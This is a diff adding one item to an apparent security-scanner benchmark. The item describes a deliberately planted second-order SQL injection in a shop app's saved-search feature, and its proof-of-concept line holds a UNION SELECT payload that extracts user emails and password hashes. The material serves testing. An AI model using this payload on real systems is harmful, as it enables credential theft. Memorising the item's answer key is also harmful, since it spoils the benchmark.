@@ -1,0 +1,44 @@
+id: BENCH-SHOP-0004
+title: Second-order SQL injection through a stored saved-search rule
+app: shopfront
+component: api
+class: sqli_second_order
+severity: critical
+entrypoint:
+  method: POST
+  path: /api/account/saved-searches
+  auth: user
+  param: rule
+  param_in: json
+  default_value: category:kitchen;price<9000
+  content_type: application/json
+discovery:
+  render: spa-react
+  reachable_from:
+  - /account/saved-searches
+  requires:
+  - js-execution
+  - multi-step-flow
+  - state-change
+  difficulty: 4
+oracle:
+  kind: sink
+  condition: 'Storing the rule is parameterised and safe, which is why a scanner watching the POST response
+    sees nothing. The rule is compiled into SQL later, by the endpoint that runs a saved search, and that
+    compilation concatenates. The sink lives on the second query: it fires when the statement executed
+    on behalf of a stored rule contains an injected clause AND returns rows from a table the compiler
+    never emits. Creating the row, on its own, is exercise.
+
+    '
+  poc: POST /api/account/saved-searches {"label":"deals","rule":"tag:x' UNION SELECT id,email,password_hash,1,1
+    FROM users--"} then GET /api/account/saved-searches/{id}/results
+  signal: shop.search.saved.plan_anomaly
+tags:
+- rest
+- json
+- postgres
+- second-order
+- authenticated
+introduced: '2026-09-05'
+decoy_note: The saved-search compiler predates the ORM and was written when rules were an internal feature
+  seeded by staff, so its input was considered trusted.
